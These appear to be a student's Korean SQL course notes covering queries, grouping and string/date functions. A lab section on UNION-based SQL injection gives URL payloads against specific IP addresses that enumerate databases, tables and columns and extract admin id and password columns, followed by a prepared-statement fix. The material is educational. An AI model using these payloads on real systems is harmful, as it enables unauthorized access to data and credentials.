select * from students union select 1,2,3,4,5;
> select 2번 쓸 때 union으로 쓸 수 있다

<a href="index.php">첫 페이지로 이동</a><br>

ALTER TABLE employees2 CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
> 한글 입력에 대해 ERROR 1366(INCORRECT STRING VALUE) 발생 시 인코딩 세팅 수정해줘야함.

SELECT * FROM employees WHERE salary BETWEEN 5000.00 AND 6000.00;
> BETWEEN 을 이용하여 WHERE 내에서 범위를 지정할 수 있음.

select * from employees2 where department='IT' and salary between 5000 and 6000;
select * from employees2 where department='HR' or salary>5000;
select * from employees2 where department='HR' and salary>5000;
select * from employees2 where department='HR' or 1;
> WHERE 문내에 between and, and, or로 조건 설정 가능함.

select * from employees2 where department is NULL;
> NULL 값이 있는 데이터 출력
select * from employees2 where department is 'IT';
> ERROR 1064

select * from employees2 order by name asc;
select * from employees2 order by name desc;
> ORDER BY 문을 이용해 데이터 정렬해서 출력 가능함.

alter table employees2 modify column name varchar(50) not null;
> 특정 열에 대해 제약조건 수정

select * from employees2 order by salary desc, name asc;
select * from employees2 where salary >= 5000 order by name asc;
> where문과 order by문의 조합을 통해 원하는 데이터를 원하는 방식으로 출력

select * from employees2 where name like '김%';
> LIKE 문을 이용해 '김'씨로 시작하는 name을 가진 데이터만 출력

select * from employees2 where name like '%영%';
> LIKE 문을 이용해 name에 '영'이 포함된 데이터만 출력

select department, count(*) as employee_count from employees2 group by department;
> employee_count라는 행에 department 별 카운트한 결과를 department 기준으로 출력

select department, count(*) as employee_count from employees2 group by department use  count(*)>=3;
> count(*) 값이 3 이상인 행만 출력

select department, count(*) as employee_count from employees2 having count(*)>=3;
> group by가 없으면 ERROR 발생(1140)

select department, avg(salary) as avg_salary from employees2 group by department having avg_salary >= 5000;
> 부서별 salary 평균값 데이터 만들고, 해당 데이터 5000 이상인 데이터만 출력

select * from employees2 union select 11,22,33,44;
> 속성 22,33은 데이터타입이 맞지않는데 왜 에러가 생기지 않는가? > 그냥 단순히 새로운 표를 합쳐주는 방식이기 때문에 상관 없다 > 속성의 수만 맞추면 된다
> SQL injection의 기본 개념임

select table_name from information_schema.tables;

use information_schema;
show tables;
select * from onestar.employees2;

SQL injection : 입력 받은 구문이 sql 쿼리 문에 직접 들어가는 경우에 공격자가 원하는대로 악의적인 쿼리 실행이 가능함
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,5 -- .
> 셀 갯수 확인하기
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,database() -- .
> 현재 어떤 DB에 있는지 확인
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,version() -- .
> 현재 호스트 OS(이 경우 ubuntu)의 버전 확인
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables -- .
> DB의 내부 구조를 파악하기 위해 information_schema의 테이블 목록 확인
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema=database() -- .
> DB의 내부 구조를 파악하기 위해 현재 DB의 테이블 목록 확인
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_name='students' -- .
> DB의 내부 구조를 파악하기 위해 현재 DB의 특정 테이블의 열 데이터 확인
> where 절에서 table_schema를 명시하지 않으면 다른 DB의 동일한 이름의 테이블에서 데이터를 추출하다가 실행이 안될 수 있음.
> 실제로 다른 DB에 같은 이름의 테이블을 만들어 두 테이블의 column 명이 전부 나오는 것을 확인함.
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_name='students' -- .

http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,name,grade,4,5 FROM students -- .
> 위에서 확인한 열 데이터로 해당 테이블에서 데이터 확인
http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,name,grade,4,5 FROM students WHERE name='John Kim' -- .
> 위에서 확인한 데이터로 특정 데이터의 정보를 확인

http://43.203.242.211:8000/table1.php?name=' UNION SELECT 1,2,3,4,database() -- .

Quiz. 강사님 DB에 어딘가 추가된 정보 확인하기
http://13.125.57.253:8000/table1.php?name=' UNION SELECT 1,2,3,4,schema_name FROM information_schema.schemata -- .
> DB 목록 확인하기
> 기본 DB 빼고 커스텀 DB들 전부 테이블 명 확인하기
> 새로운 DB twostar가 생성되어 있는 것을 확인
http://13.125.57.253:8000/table1.php?name=' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema="twostar" -- .
> twostar DB의 테이블 확인
> onestar_admin 테이블 있음
http://13.125.57.253:8000/table1.php?name=' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_name='onestar_admin' -- .
> onestar_admin 테이블의 칼럼명(id,passwd,name,birthday) 및 칼럼 수(4) 확인
http://13.125.57.253:8000/table1.php?name=' UNION SELECT 1,id,passwd,name,birthday FROM twostar.onestar_admin -- .
> 칼럼 수(5개) 맞춰서 데이터 확인 > 출력화면에 칼럼 수가 보일테니 연결된 DB 및 테이블까지 확인할 필요가 없음.
http://13.125.57.253:8000/table1.php?name=' UNION SELECT 1,id as id,passwd as passwd,name as name,birthday as birthday FROM twostar.onestar_admin -- .
> 출력의 칼럼명을 수정할 수 있을까? > 이건 안되네

SQL injection 예방 방법
$stmt = $pdo->prepare("SELECT id, name, department FROM employees2 WHERE name = ?");
$stmt->execute([$_GET['name']]);
> 외부 입력을 직접 쿼리에 삽입하지 않고, parameter로 처리하면 이런 공격이 100% 방지됩니다.

뒤에 .을 꼭 넣는 이유
> -- 뒤에 유효한 문자가 있어야 주석처리가 되는데, 공백의 경우 주소 전달 과정에서 무시되는 경우가 있음. 그래서 확실히 유효한 문자를 넣는 방식으로 .이 많이 사용됨.


문자열함수1. CONCAT
SELECT CONCAT(이름,'님') AS 인사말 FROM 고객;
alter table employees add column full_name varchar(100);> 안써도됨
update employees set full_name=concat(first_name,last_name);
>퀴즈 : 특정 칼럼의 값(first_name,last_name)을 합쳐서 새로운 칼럼(full_name)에 넣기
select first_name,last_name,concat(first_name,last_name) as full_name from employees;
> 테이블에 저장할 필요없이 확인만 한다면 위와 같은 방식으로 select 가능

문자열함수2. UPPER
SELECT UPPER(이름) AS 대문자이름 FROM 고객;
select upper(first_name), lower(email) from employees;
> 퀴즈 : 모든 직원의 이름을 대문자로 출력, 모든 직원의 이메일을 소문자로 출력

문자열함수3. LENGTH()
select last_name,length(last_name) as length from employees;
> 퀴즈 : 각 직원의 성이 몇 글자인지 출력

날짜함수1. NOW()
select now();

날짜함수2. DATE_ADD()
select first_name, birth_date,date_add(birth_date,interval 100 day) from employees;
select first_name, birth_date, date_add(birth_date, interval 6 month) from employees;
> 퀴즈 : 직원 별 birth_date 변화시켜보기

날짜함수3. YEAR(),MONTH(),DAY()
select first_name, year(birth_date) as birth_year,month(birth_date) as birth_month, day(birth_date) as birty_day from employees;
> 퀴즈 : 직원별 birth_date를 연,월,일로 분해

instar:ji_hanbyeol